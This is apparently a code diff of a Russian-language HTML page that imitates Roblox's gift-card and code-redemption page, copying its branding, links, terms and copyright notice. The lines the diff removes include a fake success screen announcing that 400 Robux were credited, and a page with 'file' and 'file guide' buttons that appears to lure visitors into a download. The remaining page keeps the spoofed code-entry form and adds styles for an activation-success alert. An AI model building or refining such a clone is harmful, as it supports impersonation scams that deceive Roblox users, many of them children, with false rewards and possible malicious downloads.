@@ -15,6 +15,7 @@
             tap-highlight-color: transparent !important;
         }
         
+        /* Убираем outline для всех элементов формы */
         input, button, textarea, select {
             outline: none;
             -webkit-tap-highlight-color: transparent !important;
@@ -26,6 +27,7 @@
             box-shadow: none;
         }
 
+        /* Отключаем выделение при тапе на мобильных */
         *:focus {
             outline: none !important;
         }
@@ -109,6 +111,7 @@
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
+        /* Черная полоска для активной кнопки в десктопной навигации */
         .nav-link.active::after {
             content: '';
             position: absolute;
@@ -146,6 +149,7 @@
             text-decoration: none;
         }
         
+        /* Мобильная навигация - ИСПРАВЛЕННАЯ */
         .mobile-nav {
             background: #fff;
             border-bottom: 1px solid #e6e6e6;
@@ -238,6 +242,7 @@
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
+        /* Черная полоска для активной кнопки в мобильной навигации - ИСПРАВЛЕННАЯ */
         .mobile-nav-link.active::after {
             content: '';
             position: absolute;
@@ -309,6 +314,7 @@
             color: #333;
         }
         
+        /* Стили для точек в процессе активации */
         .activation-dots {
             display: none;
             text-align: center;
@@ -341,6 +347,7 @@
             cursor: pointer;
             position: relative;
             flex-shrink: 0;
+            /* Убираем outline при фокусе */
             outline: none;
             -webkit-tap-highlight-color: transparent !important;
         }
@@ -409,6 +416,7 @@
             cursor: not-allowed;
         }
 
+        /* Черная полоска при нажатии - без белого квадрата */
         .redeem-btn:active::after {
             content: '';
             position: absolute;
@@ -425,6 +433,7 @@
             outline: none;
         }
 
+        /* Стили для индикатора загрузки */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -489,6 +498,7 @@
             }
         }
         
+        /* Стили для бокового меню */
         .side-menu {
             position: fixed;
             top: 0;
@@ -586,6 +596,7 @@
             display: block;
         }
         
+        /* Специальные стили для кнопки "Получить Премиум" - ЧЕРНЫЙ ФОН С БЕЛЫМ ТЕКСТОМ */
         .premium-item {
             background: #000000;
             color: white !important;
@@ -608,6 +619,7 @@
             color: white !important;
         }
         
+        /* Стили для всплывающего оповещения об успешной активации */
         .alert-overlay {
             display: none;
             position: fixed;
@@ -681,6 +693,7 @@
             outline: none;
         }
         
+        /* Стили для модального окна "Вы покидаете Roblox" */
         .leave-overlay {
             display: none;
             position: fixed;
@@ -775,6 +788,7 @@
             outline: none;
         }
         
+        /* Стили для фотографии подарочной карты */
         .photo-section {
             background: #fff;
             border-radius: 12px;
@@ -867,252 +881,6 @@
             font-size: 12px;
             line-height: 1.4;
         }
-
-        /* Стили для страницы успеха */
-        .success-page {
-            display: none;
-        }
-
-        .success-container {
-            background: white;
-            border-radius: 12px;
-            padding: 40px 30px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            margin: 20px auto;
-        }
-        
-        .success-icon {
-            font-size: 50px;
-            color: #4CAF50;
-            margin-bottom: 20px;
-        }
-        
-        .success-title {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 24px;
-            font-weight: 600;
-        }
-        
-        .success-message {
-            color: #666;
-            margin-bottom: 20px;
-            font-size: 16px;
-        }
-        
-        .success-details {
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-        
-        .success-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .success-btn {
-            padding: 12px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            text-decoration: none;
-            text-align: center;
-        }
-        
-        .success-primary {
-            background: #000;
-            color: white;
-        }
-        
-        .success-secondary {
-            background: #f0f0f0;
-            color: #333;
-        }
-        
-        .back-link {
-            color: #007bff;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        
-        /* Новые стили для всплывающего окна как на скриншоте */
-        .success-popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 1004;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .success-popup {
-            background: white;
-            border-radius: 12px;
-            padding: 30px 24px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-        }
-        
-        .success-popup-title {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            color: #333;
-        }
-        
-        .success-popup-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 20px;
-        }
-        
-        .success-popup-btn {
-            padding: 14px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: 600;
-            position: relative;
-            transition: all 0.2s ease;
-        }
-        
-        .success-popup-primary {
-            background: #000000;
-            color: white;
-        }
-        
-        .success-popup-primary:hover {
-            background: #333333;
-        }
-        
-        .success-popup-primary:active::after {
-            content: '';
-            position: absolute;
-            bottom: -4px;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: #000000;
-            border-radius: 1px;
-        }
-        
-        .success-popup-primary:active {
-            transform: translateY(1px);
-            outline: none;
-        }
-        
-        /* Стили для страницы с файлами */
-        .files-page {
-            display: none;
-        }
-        
-        .files-container {
-            background: white;
-            border-radius: 12px;
-            padding: 30px 24px;
-            max-width: 440px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            margin: 20px auto;
-        }
-        
-        .files-title {
-            color: #333;
-            margin-bottom: 24px;
-            font-size: 24px;
-            font-weight: 600;
-        }
-        
-        .files-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-        
-        .file-btn {
-            padding: 16px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            text-decoration: none;
-            text-align: center;
-            font-weight: 600;
-            position: relative;
-            transition: all 0.2s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .file-btn-primary {
-            background: #000000;
-            color: white;
-        }
-        
-        .file-btn-primary:hover {
-            background: #333333;
-        }
-        
-        .file-btn-secondary {
-            background: #00a2ff;
-            color: white;
-        }
-        
-        .file-btn-secondary:hover {
-            background: #0088cc;
-        }
-        
-        .file-btn:active::after {
-            content: '';
-            position: absolute;
-            bottom: -4px;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: currentColor;
-            border-radius: 1px;
-            opacity: 0.7;
-        }
-        
-        .file-btn:active {
-            transform: translateY(1px);
-            outline: none;
-        }
-        
-        .files-back-link {
-            color: #007bff;
-            text-decoration: none;
-            font-size: 14px;
-            display: inline-block;
-            margin-top: 16px;
-        }
         
         @media (max-width: 768px) {
             .top-nav {
@@ -1152,7 +920,7 @@
         </div>
     </nav>
 
-    <!-- Мобильная навигация -->
+    <!-- Мобильная навигация - ИСПРАВЛЕННАЯ -->
     <nav class="mobile-nav">
         <div class="mobile-nav-top">
             <div class="mobile-nav-left">
@@ -1197,25 +965,155 @@
                 <ul class="side-menu-list">
                     <li class="side-menu-item">
                         <a href="https://www.roblox.com/home" class="side-menu-link">
-                            <div class="side-menu-icon">🏠</div>
+                            <div class="side-menu-icon">
+                                <!-- Дом -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M9 22V12H15V22" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
                             <span>Дом</span>
                         </a>
                     </li>
                     <li class="side-menu-item">
                         <a href="https://www.roblox.com/users/profile" class="side-menu-link">
-                            <div class="side-menu-icon">👤</div>
+                            <div class="side-menu-icon">
+                                <!-- Профиль -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
                             <span>Профиль</span>
                         </a>
                     </li>
                     <li class="side-menu-item">
                         <a href="https://www.roblox.com/messages" class="side-menu-link">
-                            <div class="side-menu-icon">💬</div>
+                            <div class="side-menu-icon">
+                                <!-- Сообщения -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M21 15C21 15.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 17 19 17H7L3 21V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H19C19.5304 3 20.0391 3.21071 20.4142 3.58579C20.7893 3.96086 21 4.46957 21 5V15Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
                             <span>Сообщения</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://www.roblox.com/friends" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Соединять -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M17 21V19C17 17.9391 16.5786 16.9217 15.8284 16.1716C15.0783 15.4214 14.0609 15 13 15H5C3.93913 15 2.92172 15.4214 2.17157 16.1716C1.42143 16.9217 1 17.9391 1 19V21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M9 11C11.2091 11 13 9.20914 13 7C13 4.79086 11.2091 3 9 3C6.79086 3 5 4.79086 5 7C5 9.20914 6.79086 11 9 11Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M23 21V19C22.9993 18.1137 22.7044 17.2528 22.1614 16.5523C21.6184 15.8519 20.8581 15.3516 20 15.13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M16 3.13C16.8604 3.35031 17.623 3.85071 18.1676 4.55232C18.7122 5.25392 19.0078 6.11683 19.0078 7.005C19.0078 7.89318 18.7122 8.75608 18.1676 9.45769C17.623 10.1593 16.8604 10.6597 16 10.88" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Соединять</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://www.roblox.com/avatar" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Аватар -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M21 16V20C21 20.55 20.55 21 20 21H4C3.45 21 3 20.55 3 20V16C3 14.14 5.61 12.68 8.5 12.17C8.51 12.15 8.52 12.13 8.53 12.11C8.56 12.06 8.59 12.01 8.62 11.96C9.21 11.04 10.08 10.32 11.11 9.94C11.33 9.86 11.56 9.8 11.8 9.75C12.04 9.7 12.29 9.67 12.55 9.65C12.7 9.64 12.85 9.63 13 9.63C13.15 9.63 13.3 9.64 13.45 9.65C13.71 9.67 13.96 9.7 14.2 9.75C14.44 9.8 14.67 9.86 14.89 9.94C15.92 10.32 16.79 11.04 17.38 11.96C17.41 12.01 17.44 12.06 17.47 12.11C17.48 12.13 17.49 12.15 17.5 12.17C20.39 12.68 23 14.14 23 16V20C23 20.55 22.55 21 22 21H21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Аватар</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://www.roblox.com/users/inventory" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Инвентарь -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M19 11H5C3.89543 11 3 11.8954 3 13V20C3 21.1046 3.89543 22 5 22H19C20.1046 22 21 21.1046 21 20V13C21 11.8954 20.1046 11 19 11Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M7 11V7C7 5.67392 7.52678 4.40215 8.46447 3.46447C9.40215 2.52678 10.6739 2 12 2C13.3261 2 14.5979 2.52678 15.5355 3.46447C16.4732 4.40215 17 5.67392 17 7V11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Инвентарь</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://www.roblox.com/trades" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Торговля -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M8 7H20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M16 17H4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M17 4L21 8L17 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M7 20L3 16L7 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Торговля</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://www.roblox.com/groups" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Сообщества -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M9 7H15C15.7956 7 16.5587 7.31607 17.1213 7.87868C17.6839 8.44129 18 9.20435 18 10V16C18 16.7956 17.6839 17.5587 17.1213 18.1213C16.5587 18.6839 15.7956 19 15 19H9C8.20435 19 7.44129 18.6839 6.87868 18.1213C6.31607 17.5587 6 16.7956 6 16V10C6 9.20435 6.31607 8.44129 6.87868 7.87868C7.44129 7.31607 8.20435 7 9 7Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M12 12C13.1046 12 14 11.1046 14 10C14 8.89543 13.1046 8 12 8C10.8954 8 10 8.89543 10 10C10 11.1046 10.8954 12 12 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Сообщества</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://blog.roblox.com" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Блог -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M14 2H6C5.46957 2 4.96086 2.21071 4.58579 2.58579C4.21071 2.96086 4 3.46957 4 4V20C4 20.5304 4.21071 21.0391 4.58579 21.4142C4.96086 21.7893 5.46957 22 6 22H18C18.5304 22 19.0391 21.7893 19.4142 21.4142C19.7893 21.0391 20 20.5304 20 20V8L14 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M14 2V8H20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M16 13H8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M16 17H8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M10 9H9H8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Блог</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="#" class="side-menu-link" id="official-store-link">
+                            <div class="side-menu-icon">
+                                <!-- Официальный магазин -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M6 2L3 6V20C3 20.5304 3.21071 21.0391 3.58579 21.4142C3.96086 21.7893 4.46957 22 5 22H19C19.5304 22 20.0391 21.7893 20.4142 21.4142C20.7893 21.0391 21 20.5304 21 20V6L18 2H6Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M3 6H21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M16 10C16 11.0609 15.5786 12.0783 14.8284 12.8284C14.0783 13.5786 13.0609 14 12 14C10.9391 14 9.92172 13.5786 9.17157 12.8284C8.42143 12.0783 8 11.0609 8 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Официальный магазин</span>
+                        </a>
+                    </li>
+                    <li class="side-menu-item">
+                        <a href="https://www.roblox.com/gamecards" class="side-menu-link">
+                            <div class="side-menu-icon">
+                                <!-- Подарочные карты -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 12V20C20 20.5304 19.7893 21.0391 19.4142 21.4142C19.0391 21.7893 18.5304 22 18 22H6C5.46957 22 4.96086 21.7893 4.58579 21.4142C4.21071 21.0391 4 20.5304 4 20V12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M22 7H2V12H22V7Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M12 22V7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M12 7H7.5C6.83696 7 6.20107 6.73661 5.73223 6.26777C5.26339 5.79893 5 5.16304 5 4.5C5 3.83696 5.26339 3.20107 5.73223 2.73223C6.20107 2.26339 6.83696 2 7.5 2C11 2 12 7 12 7Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M12 7H16.5C17.163 7 17.7989 6.73661 18.2678 6.26777C18.7366 5.79893 19 5.16304 19 4.5C19 3.83696 18.7366 3.20107 18.2678 2.73223C17.7989 2.26339 17.163 2 16.5 2C13 2 12 7 12 7Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <span>Подарочные карты</span>
                         </a>
                     </li>
                     <li class="side-menu-item premium-item">
                         <a href="https://www.roblox.com/premium" class="side-menu-link">
-                            <div class="side-menu-icon premium-icon">⭐</div>
+                            <div class="side-menu-icon premium-icon">
+                                <!-- Получить Премиум -->
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
                             <span>Получить Премиум</span>
                         </a>
                     </li>
@@ -1227,124 +1125,72 @@
     <!-- Затемнение фона при открытом меню -->
     <div class="side-menu-overlay" id="side-menu-overlay"></div>
 
-    <!-- Главная страница активации -->
-    <div id="activation-page">
-        <div class="container">
-            <h1>Активировать коды Roblox</h1>
-            <p class="subtitle">Введите ниже вашу подарочную карту, виртуальный предмет или промокод.</p>
-            
-            <div class="code-label">Код</div>
-            
-            <div class="code-input-container">
-                <input type="text" class="code-input" placeholder="Введите код" id="code-input" maxlength="20">
-            </div>
-            
-            <div class="activation-dots" id="activation-dots">••••••••</div>
-            
-            <div class="terms-container">
-                <input type="checkbox" id="terms-checkbox" class="terms-checkbox">
-                <label for="terms-checkbox" class="terms">
-                    Отмечая это поле, вы подтверждаете, что вам исполнилось 18 лет, или что вы являетесь родителем или законным опекуном владельца учётной записи, и соглашаетесь с нашими <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условиями использования</a>, включая арбитражную оговорку и <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Условия использования подарочных карт</a>, а также с нашей <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Политикой конфиденциальности</a>. Вы также подтверждаете и соглашаетесь с тем, что сумма, указанная на лицевой стороне вашей подарочной карты, будет эквивалентна кредиту Roblox в вашей местной валюте.
-                </label>
-            </div>
-            
-            <button class="redeem-btn" id="redeem-btn" disabled>Выкупать</button>
-            
-            <div class="photo-section">
-                <img src="https://i.postimg.cc/L5ZWhGH5/90e6639469a816169ab104e8bc2070a1-roblox-gift-card.png" alt="Roblox Gift Card" class="gift-card-image">
-            </div>
-            
-            <div class="info-panel">
-                <div class="info-title">Дополнительная информация</div>
-                <ul class="info-list">
-                    <li><a href="https://www.youtube.com/watch?v=6fL1Dk3j4qk" target="_blank">Как использовать подарочные карты (видео)</a></li>
-                    <li><a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Дополнительная информация о подарочных картах</a></li>
-                    <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать коды виртуальных предметов</a></li>
-                    <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать промокоды</a></li>
-                </ul>
-            </div>
-            
-            <div class="footer">
-                <div class="language-selector">
-                    <select>
-                        <option>Русский</option>
-                        <option>English</option>
-                        <option>Español</option>
-                    </select>
-                </div>
-                
-                <div class="footer-links">
-                    <a href="https://www.roblox.com/info/about" target="_blank">О нас</a>
-                    <a href="https://corp.roblox.com/careers/" target="_blank">Работа</a>
-                    <a href="https://blog.roblox.com/" target="_blank">Блог</a>
-                    <a href="https://corp.roblox.com/parents/" target="_blank">Родители</a>
-                    <a href="https://www.roblox.com/gamecards" target="_blank">Подарочные карты</a>
-                </div>
-                
-                <p class="copyright">©2025 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными и незарегистрированными товарными знаками в США и других странах.</p>
-            </div>
+    <div class="container">
+        <h1>Активировать коды Roblox</h1>
+        <p class="subtitle">Введите ниже вашу подарочную карту, виртуальный предмет или промокод.</p>
+        
+        <div class="code-label">Код</div>
+        
+        <div class="code-input-container">
+            <input type="text" class="code-input" placeholder="Введите код" id="code-input" maxlength="20">
         </div>
-    </div>
-
-    <!-- Страница успеха -->
-    <div id="success-page" class="success-page">
-        <div class="success-container">
-            <div class="success-icon">✓</div>
-            <h1 class="success-title">Код успешно активирован!</h1>
-            
-            <p class="success-message">
-                Ваш код был успешно активирован. Робуксы были зачислены на ваш аккаунт.
-            </p>
-            
-            <div class="success-details">
-                <div class="detail-row">
-                    <span>Код:</span>
-                    <span id="activated-code">••••••••</span>
-                </div>
-                <div class="detail-row">
-                    <span>Начислено:</span>
-                    <span>400 Робуксов</span>
-                </div>
-                <div class="detail-row">
-                    <span>Дата активации:</span>
-                    <span id="activation-date"></span>
-                </div>
-            </div>
-            
-            <div class="success-buttons">
-                <button class="success-btn success-primary" onclick="goToRoblox()">Играть в Roblox</button>
-                <button class="success-btn success-secondary" onclick="activateAnother()">Активировать другой код</button>
-            </div>
-            
-            <a href="#" class="back-link" onclick="activateAnother()">← Вернуться на главную</a>
+        
+        <!-- Блок с точками, который появляется при активации -->
+        <div class="activation-dots" id="activation-dots">••••••••</div>
+        
+        <div class="terms-container">
+            <input type="checkbox" id="terms-checkbox" class="terms-checkbox">
+            <label for="terms-checkbox" class="terms">
+                Отмечая это поле, вы подтверждаете, что вам исполнилось 18 лет, или что вы являетесь родителем или законным опекуном владельца учётной записи, и соглашаетесь с нашими <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условиями использования</a>, включая арбитражную оговорку и <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Условия использования подарочных карт</a>, а также с нашей <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Политикой конфиденциальности</a>. Вы также подтверждаете и соглашаетесь с тем, что сумма, указанная на лицевой стороне вашей подарочной карты, будет эквивалентна кредиту Roblox в вашей местной валюте.
+            </label>
         </div>
-    </div>
-
-    <!-- Новое всплывающее окно успеха (как на скриншоте) -->
-    <div class="success-popup-overlay" id="success-popup-overlay">
-        <div class="success-popup">
-            <div class="success-popup-title">Код успешно активирован</div>
-            <div class="success-popup-buttons">
-                <button class="success-popup-btn success-popup-primary" onclick="goToFilesPage()">Вернуться к погашению</button>
-            </div>
+        
+        <button class="redeem-btn" id="redeem-btn" disabled>Выкупать</button>
+        
+        <div class="photo-section">
+            <img src="https://i.postimg.cc/L5ZWhGH5/90e6639469a816169ab104e8bc2070a1-roblox-gift-card.png" alt="Roblox Gift Card" class="gift-card-image">
         </div>
-    </div>
-
-    <!-- Страница с файлами -->
-    <div id="files-page" class="files-page">
-        <div class="files-container">
-            <h1 class="files-title">Доступные файлы</h1>
-            
-            <div class="files-buttons">
-                <button class="file-btn file-btn-primary" onclick="openFile()">
-                    📂 ФАЙЛ
-                </button>
-                <button class="file-btn file-btn-secondary" onclick="openGuide()">
-                    📖 ГАЙД НА ФАЙЛ
-                </button>
+        
+        <div class="info-panel">
+            <div class="info-title">Дополнительная информация</div>
+            <ul class="info-list">
+                <li><a href="https://www.youtube.com/watch?v=6fL1Dk3j4qk" target="_blank">Как использовать подарочные карты (видео)</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Дополнительная информация о подарочных картах</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать коды виртуальных предметов</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать промокоды</a></li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <div class="language-selector">
+                <select>
+                    <option>Русский</option>
+                    <option>English</option>
+                    <option>Español</option>
+                    <option>Português</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                    <option>한국어</option>
+                    <option>日本語</option>
+                    <option>中文</option>
+                </select>
             </div>
             
-            <a href="#" class="files-back-link" onclick="backToActivation()">← Вернуться к активации кодов</a>
+            <div class="footer-links">
+                <a href="https://www.roblox.com/info/about" target="_blank">О нас</a>
+                <a href="https://corp.roblox.com/careers/" target="_blank">Работа</a>
+                <a href="https://blog.roblox.com/" target="_blank">Блог</a>
+                <a href="https://corp.roblox.com/parents/" target="_blank">Родители</a>
+                <a href="https://www.roblox.com/gamecards" target="_blank">Подарочные карты</a>
+                <a href="https://en.help.roblox.com/hc/en-us" target="_blank">Помощь</a>
+                <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условия</a>
+                <a href="https://corp.roblox.com/accessibility/" target="_blank">Доступность</a>
+                <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Конфиденциальность</a>
+                <a href="https://www.roblox.com/info/privacy" target="_blank">Ваш выбор конфиденциальности</a>
+                <a href="https://www.roblox.com/sitemap" target="_blank">Карта сайта</a>
+            </div>
+            
+            <p class="copyright">©2025 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными и незарегистрированными товарными знаками в США и других странах.</p>
         </div>
     </div>
 
@@ -1370,7 +1216,7 @@
         </div>
     </div>
 
-    <!-- Модальное окно "Вы покидаете Roblox" -->
+    <!-- Модальное окна "Вы покидаете Roblox" -->
     <div class="leave-overlay" id="leave-overlay">
         <div class="leave-box">
             <div class="leave-title">Вы покидаете Roblox</div>
@@ -1387,11 +1233,6 @@
     </div>
 
     <script>
-        // Элементы страницы активации
-        const activationPage = document.getElementById('activation-page');
-        const successPage = document.getElementById('success-page');
-        const successPopupOverlay = document.getElementById('success-popup-overlay');
-        const filesPage = document.getElementById('files-page');
         const termsCheckbox = document.getElementById('terms-checkbox');
         const redeemBtn = document.getElementById('redeem-btn');
         const codeInput = document.getElementById('code-input');
@@ -1399,8 +1240,6 @@
         const loadingOverlay = document.getElementById('loading-overlay');
         const alertOverlay = document.getElementById('alert-overlay');
